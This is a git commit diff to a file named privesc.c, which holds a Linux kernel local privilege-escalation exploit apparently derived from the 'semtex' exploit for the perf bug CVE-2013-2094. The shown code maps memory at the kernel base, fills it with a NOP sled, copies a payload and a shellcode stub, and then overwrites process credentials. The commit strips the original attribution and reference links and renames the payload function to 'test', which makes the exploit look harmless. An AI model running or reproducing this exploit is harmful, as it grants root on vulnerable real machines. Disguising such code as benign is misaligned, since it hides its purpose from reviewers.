ab6a54f4296ac39041eada5d2722d02feb32458a
kyeh0 <z0rro@z0rro.net>
2018-05-07 14:31:32 -0700

    Update privesc.c

--- privesc.c
+++ privesc.c
@@ -1,14 +1,6 @@
 /*
  * linux 2.6.37-3.x.x x86_64, ~100 LOC
  * gcc-4.6 -O2 semtex.c && ./a.out
- * 2010 sd@fucksheep.org, salut!
- *
- * update may 2013:
- * seems like centos 2.6.32 backported the perf bug, lol.
- * jewgold to 115T6jzGrVMgQ2Nt1Wnua7Ch1EuL9WXT2g if you insist.
- * 
- * EDB Note: Update ~ http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
- *                                 ~ https://github.com/realtalk/cve-2013-2094/blob/master/rewritten_semtex.c
  */
  
 #define _GNU_SOURCE 1
@@ -27,7 +19,7 @@
 #define KSIZE  0x2000000
 #define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))
  
-void fuck() {
+void test() {
   int i,j,k;
   uint64_t uids[4] = { AB(2), AB(3), AB(4), AB(5) };
   uint8_t *current = *(uint8_t **)(((uint64_t)uids) & (-8192));
@@ -75,9 +67,9 @@ int  main() {
   kbase = idt.addr & 0xff000000;
   u = getuid(); g = getgid();
   assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
-  memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &fuck, 1024);
+  memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &test, 1024);
   memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf",
-    printf("2.6.37-3.x x86_64\nsd@fucksheep.org 2010\n") % 27);
+    printf("2.6.37-3.x x86_64\n") % 27);
   setresuid(u,u,u); setresgid(g,g,g);
   while (j--) {
     needle = AB(j+1);
